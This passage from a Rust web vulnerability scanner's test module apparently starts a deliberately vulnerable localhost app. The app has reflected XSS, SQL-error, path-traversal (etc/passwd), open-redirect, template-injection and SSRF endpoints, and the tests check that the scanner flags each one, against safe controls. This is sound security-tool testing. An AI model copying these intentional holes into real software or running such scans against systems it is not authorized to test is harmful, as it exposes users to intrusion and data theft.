                "Finished: {} requests, {} issues",
                requests.load(Ordering::SeqCst),
                issues.load(Ordering::SeqCst)
            )
        };
        done.store(true, Ordering::SeqCst);
        if let Some(ctx) = state.lock().unwrap().ctx.clone() {
            ctx.request_repaint();
        }
    });
    task
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{BufRead, BufReader, Read, Write};

    #[test]
    fn insertion_points() {
        let req = "POST /a?x=1&y=two HTTP/1.1\r\nHost: h\r\nCookie: s=abc; t=1\r\nUser-Agent: UA\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 7\r\n\r\nu=a&p=b";
        let ps = points(req);
        let names: Vec<(Kind, &str, &str)> = ps
            .iter()
            .map(|p| (p.kind, p.name.as_str(), &req[p.start..p.end]))
            .collect();
        assert_eq!(
            names,
            [
                (Kind::Query, "x", "1"),
                (Kind::Query, "y", "two"),
                (Kind::Cookie, "s", "abc"),
                (Kind::Cookie, "t", "1"),
                (Kind::Header, "User-Agent", "UA"),
                (Kind::Body, "u", "a"),
                (Kind::Body, "p", "b")
            ]
        );
        let r = inject(req, &ps[1], "a b'&");
        assert!(r.starts_with("POST /a?x=1&y=a%20b'%26 HTTP/1.1"));
        let r = inject(req, &ps[5], "<x>");
        assert!(r.ends_with("\r\n\r\nu=%3Cx%3E&p=b") && r.contains("Content-Length: 13"));
        let json = "POST / HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"name\":\"bob\",\"age\":30}";
        let jp = points(json);
        assert_eq!(
            jp.iter().map(|p| &json[p.start..p.end]).collect::<Vec<_>>(),
            ["bob", "30"]
        );
        assert!(inject(json, &jp[0], "a\"b").contains("{\"name\":\"a\\\"b\",\"age\":30}"));
        assert!(inject(json, &jp[1], "1'").contains("\"age\":\"1'\""));
        let (t, path) = parse_url("http://127.0.0.1:9/x?y=1").unwrap();
        assert_eq!(
            (t.host.as_str(), t.port, t.tls, path.as_str()),
            ("127.0.0.1", 9, false, "/x?y=1")
        );
    }

    /// A deliberately vulnerable web app: one endpoint per issue class plus a safe control.
    fn vulnerable_app() -> u16 {
        let srv = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = srv.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for c in srv.incoming().flatten() {
                std::thread::spawn(move || {
                    let mut r = BufReader::new(c.try_clone().unwrap());
                    let mut head = String::new();
                    let mut line = String::new();
                    let mut len = 0;
                    while r.read_line(&mut line).is_ok_and(|n| n > 2) {
                        if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") {
                            len = v.trim().parse().unwrap_or(0);
                        }
                        head += &line;
                        line.clear();
                    }
                    let mut body = vec![0; len];
                    let _ = r.read_exact(&mut body);
                    let target = head.split_whitespace().nth(1).unwrap_or("/").to_string();
                    let (path, q) = target.split_once('?').unwrap_or((&target, ""));
                    let all = format!("{q}&{}", String::from_utf8_lossy(&body));
                    let arg = |k: &str| {
                        all.split('&')
                            .find_map(|kv| kv.strip_prefix(&format!("{k}=")))
                            .map(|v| {
                                String::from_utf8_lossy(&crate::codec::url_decode(
                                    &v.replace('+', " "),
                                ))
                                .into_owned()
                            })
                            .unwrap_or_default()
                    };
                    let html =
                        |b: String| ("200 OK", vec![("Content-Type", "text/html".to_string())], b);
                    let (status, headers, body) = match path {
                        "/" => html("<a href=\"/search?q=hi\">s</a> <a href='/item?id=1'>i</a> <a href=\"/file?name=a.txt\">f</a> <a href=\"/go?url=/home\">g</a> <a href=\"/tpl?name=x\">t</a> <a href=\"/fetch?u=http://x/\">fetch</a> <a href=\"/safe?q=1\">safe</a> <img src=\"/logo.png\"> <a href=\"https://other.example/\">ext</a> <form method=post action=/login><input name=user><input type=password name=pass></form>".into()),
                        "/search" => html(format!("Results for {}", arg("q"))),
                        "/safe" => html(format!("Results for {}", crate::codec::html_encode(arg("q").as_bytes(), false))),
                        "/item" => {
                            let id = arg("id");
                            if id.contains('\'') {
                                html("<b>Warning</b>: You have an error in your SQL syntax; check the manual".into())
                            } else if id == "1" || id.ends_with("AND 1=1") {
                                html("Item 1: a red chair, comfortable and cheap, in stock".into())
                            } else {
                                html("No such item".into())
                            }
                        }
                        "/file" => html(if arg("name").contains("etc/passwd") { "root:x:0:0:root:/root:/bin/bash".into() } else { "file contents".into() }),
                        "/go" => ("302 Found", vec![("Location", arg("url"))], String::new()),
                        "/tpl" => {
                            // evaluates `{{a*b}}` like a real engine, so a wrong expected product fails
                            let n = arg("name");
                            let v = n.strip_prefix("{{").and_then(|e| e.strip_suffix("}}")).and_then(|e| e.split_once('*')).and_then(|(a, b)| Some(a.parse::<u64>().ok()? * b.parse::<u64>().ok()?));
                            html(format!("Hello {}", v.map_or(n, |v| v.to_string())))
                        }
                        "/fetch" => {
                            // SSRF: fetches http URLs given in `u`
                            if let Some(rest) = arg("u").strip_prefix("http://") {
                                let (hp, p) = rest.split_once('/').unwrap_or((rest, ""));
                                if let Ok(mut s) = std::net::TcpStream::connect(hp) {
                                    let _ = write!(s, "GET /{p} HTTP/1.1\r\nHost: {hp}\r\nConnection: close\r\n\r\n");
                                    let mut sink = vec![];
                                    let _ = s.read_to_end(&mut sink);
                                }
                            }
                            html("fetched".into())
                        }
                        "/.git/HEAD" => ("200 OK", vec![], "ref: refs/heads/main\n".into()),
                        "/login" => html(format!("Welcome {}", crate::codec::html_encode(arg("user").as_bytes(), false))),
                        _ => ("404 Not Found", vec![], "nope".into()),
                    };
                    let mut c = c;
                    let extra: String = headers
                        .iter()
                        .map(|(k, v)| format!("{k}: {v}\r\n"))
                        .collect();
                    let _ = write!(
                        c,
                        "HTTP/1.1 {status}\r\n{extra}Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                });
            }
        });
        port
    }

    #[test]
    fn crawls_and_finds_each_issue_class() {
        let _g = crate::collab::TEST_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let collab = burpcraft_server::start(burpcraft_server::Config::default()).unwrap();
        {
            let mut c = crate::collab::client().lock().unwrap();
            (c.server, c.domain, c.secret) = (
                format!("127.0.0.1:{}", collab.http_port),
                String::new(),
                String::new(),
            );
        }
        let port = vulnerable_app();
        {
            let mut b = crate::bcheck::checks().lock().unwrap();
            b.0.push(crate::bcheck::parse(crate::bcheck::TEMPLATE).unwrap());
            b.0.push(crate::bcheck::parse("metadata:\n name: \"Echoed marker\"\ngiven query insertion point then\n send payload:\n  replacing: \"bcmark42\"\n if \"bcmark42\" in {latest.response.body} then\n  report issue:\n   severity: info\n end if").unwrap());
        }
        let state = proxy::Shared::new();
        let task = start(
            1,
            vec![format!("http://127.0.0.1:{port}/")],
            vec![],
            Config::fast(),
            state.clone(),
        );
        for _ in 0..600 {
            if task.done.load(Ordering::SeqCst) {
                break;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        assert!(
            task.done.load(Ordering::SeqCst),
            "scan did not finish: {}",
            task.status.lock().unwrap()
        );
        let s = state.lock().unwrap();
        let mut found: Vec<(String, &str)> =
            s.issues.iter().map(|i| (i.path.clone(), i.name)).collect();
        found.sort();
        found.dedup();
        let expect = [
            ("/fetch", "External service interaction"),
            ("/file", "File path traversal"),
            ("/go", "Open redirection"),
            ("/item", "SQL injection"),
            ("/search", "Cross-site scripting (reflected)"),
            ("/tpl", "Server-side template injection"),
            ("/.git/HEAD", "Exposed git repository"),
            ("/search", "Echoed marker"),
        ];
        for (p, n) in expect {
            assert!(
                found.iter().any(|(fp, fn_)| fp == p && *fn_ == n),
                "missing {n} on {p}; found {found:?}"
            );
        }
        // negative controls: escaped reflection and the login form are clean
        assert!(
            !found
                .iter()
                .any(|(p, n)| (p == "/safe" || p == "/login") && *n != "Echoed marker"),
            "false positive: {found:?}"
        );
        // crawler stayed on the origin and skipped static files
        assert!(
            s.history
                .iter()
                .filter(|e| e.tool == "Crawler")
                .all(|e| e.port == port && !e.url.ends_with(".png"))
        );
        assert!(task.status.lock().unwrap().starts_with("Finished"));
    }
}
